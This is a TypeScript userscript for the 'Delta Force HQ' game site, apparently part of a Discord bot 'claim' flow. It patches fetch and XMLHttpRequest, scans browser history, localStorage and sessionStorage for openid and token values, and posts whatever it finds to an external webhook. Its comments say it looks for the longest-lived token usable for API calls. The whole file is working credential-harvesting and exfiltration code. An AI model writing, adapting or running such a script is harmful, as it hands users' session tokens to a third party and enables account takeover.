/*
 * Delta Force HQ — Webhook userscript
 *
 * Hook fetch/XHR để intercept TẤT CẢ DfTools call.
 * Capture TẤT CẢ params từ URL (openid, token, ts, s, u) + body → POST về webhook.
 *
 * Thay vì chỉ intercept GetMyData, script này scan mọi endpoint DfTools
 * để tìm token dài hạn nhất có thể dùng cho API calls.
 */

(function (): void {
  var WEBHOOK_URL = '@@WEBHOOK_URL@@';
  var CODE = '@@CLAIM_CODE@@';
  var sent = false;
  var allCalls: Array<{
    url: string;
    method: string;
    hasToken: boolean;
    hasOpenid: boolean;
    tokenLen: number;
  }> = [];

  function log(msg: string, color = '#0f0'): void {
    console.log('%c[DF] ' + msg, 'color:' + color + '; font-weight:bold');
  }

  function send(
    openid: string,
    token: string,
    ts: string,
    s: string,
    u: string,
    source: string,
  ): void {
    log('T\xecm thảy token từ ' + source + ': openid=' + openid);
    log('token len=' + token.length + ', ts=' + ts + ', s=' + s + ', u=' + u, '#888');
    log('token preview: ' + token.substring(0, 16) + '...', '#ff0');

    try {
      fetch(WEBHOOK_URL + '/api/df/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          code: CODE,
          openid,
          token,
          ts,
          s,
          u,
          _source: source,
        }),
        mode: 'no-cors',
      });
      log('✅ Đã gửi về bot — chờ DM xác nhận!');
      sent = true;
    } catch (e: unknown) {
      log('❌ Gửi fail: ' + (e as Error).message, '#f00');
    }
  }

  function extractFromUrl(url: string, method: string, source: string): void {
    if (sent) return;
    try {
      var params = new URL(url).searchParams;
      var oid = params.get('openid');
      var tok = params.get('token');

      var callInfo = {
        url: url.split('?')[0].split('/').pop() || url.split('/').pop() || '?',
        method: method,
        hasOpenid: !!oid,
        hasToken: !!tok,
        tokenLen: tok ? tok.length : 0,
      };
      allCalls.push(callInfo);

      if (!oid || !tok) return;

      var ts = params.get('ts') || '0';
      var s = params.get('s') || '0';
      var u = params.get('u') || '';
      send(oid, tok, ts, s, u, source + '(url=' + callInfo.url + ')');
    } catch {
      // ignore bad urls
    }
  }

  // ─── Hook fetch ─────────────────────────────────────────────
  var oldFetch = window.fetch;
  window.fetch = function (...args: Parameters<typeof fetch>): Promise<Response> {
    var url = args[0];
    if (typeof url === 'string' && url.indexOf('DfTools') !== -1) {
      extractFromUrl(url, 'fetch', 'fetch');
    }
    return (oldFetch as any).apply(this, args);
  };

  // ─── Hook XHR ───────────────────────────────────────────────
  var oldOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function (m: string, u: string | URL, ...rest: unknown[]): void {
    (this as any)._m = m;
    (this as any)._u = u;
    return oldOpen.apply(this, [m, u, ...rest] as any);
  };
  var oldSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function (
    _body?: Document | XMLHttpRequestBodyInit | null,
  ): void {
    var url = (this as any)._u as string;
    if (url && url.indexOf('DfTools') !== -1) {
      extractFromUrl(url, (this as any)._m || 'xhr', 'xhr');
    }
    return oldSend.apply(this, arguments as any);
  };

  // ─── Performance API scan (already-loaded calls) ────────────
  try {
    var entries = performance.getEntriesByType('resource') as PerformanceResourceTiming[];
    for (var i = 0; i < entries.length && !sent; i++) {
      var name = entries[i].name;
      if (name.indexOf('DfTools') !== -1) {
        log('✅ Found DfTools trong history: ' + name.split('/').pop(), '#0f0');
        extractFromUrl(name, 'perf-scan', 'perf');
      }
    }
  } catch (e: unknown) {
    log('⚠️ Performance scan: ' + (e as Error).message, '#f80');
  }

  // ─── localStorage scan ──────────────────────────────────────
  if (!sent) {
    try {
      var hints = ['token', 'auth', 'user', 'openid', 'df', 'delta', 'sess', 'garena', 'login'];
      for (var j = 0; j < localStorage.length && !sent; j++) {
        var key = localStorage.key(j);
        if (!key) continue;
        for (var h = 0; h < hints.length && !sent; h++) {
          if (key.toLowerCase().indexOf(hints[h]) !== -1) {
            var val = localStorage.getItem(key);
            if (val) {
              try {
                var obj = JSON.parse(val);
                if (obj && obj.openid && obj.token) {
                  log('localStorage[' + key + '] có openid+token', '#ff0');
                  send(
                    obj.openid,
                    obj.token,
                    obj.ts || '0',
                    obj.s || '0',
                    obj.u || '',
                    'localStorage:' + key,
                  );
                } else if (obj && obj.token) {
                  log('localStorage[' + key + '] có token nhưng thiếu openid', '#f80');
                }
              } catch {
                // not JSON — log raw value preview
                log('localStorage[' + key + '] = ' + val.substring(0, 50), '#888');
              }
            }
          }
        }
      }
    } catch {
      /* ignore */
    }
  }

  // ─── sessionStorage scan ────────────────────────────────────
  if (!sent) {
    try {
      var ssHints = ['token', 'auth', 'openid', 'df', 'garena'];
      for (var k = 0; k < sessionStorage.length && !sent; k++) {
        var sKey = sessionStorage.key(k);
        if (!sKey) continue;
        for (var hh = 0; hh < ssHints.length && !sent; hh++) {
          if (sKey.toLowerCase().indexOf(ssHints[hh]) !== -1) {
            var sVal = sessionStorage.getItem(sKey);
            if (sVal) {
              try {
                var sObj = JSON.parse(sVal);
                if (sObj && sObj.openid && sObj.token) {
                  log('sessionStorage[' + sKey + '] có openid+token', '#ff0');
                  send(
                    sObj.openid,
                    sObj.token,
                    sObj.ts || '0',
                    sObj.s || '0',
                    sObj.u || '',
                    'sessionStorage:' + sKey,
                  );
                }
              } catch {
                /* ignore */
              }
            }
          }
        }
      }
    } catch {
      /* ignore */
    }
  }

  if (!sent) {
    log('⏳ Chưa t\xecm thảy token. DfTools calls thấy: ' + allCalls.length, '#ff0');
    if (allCalls.length > 0) {
      console.table(allCalls.slice(0, 20));
    }
    log('Nhén vài nút tr\xean trang HQ để trigger API call mới', '#888');
  }
})();
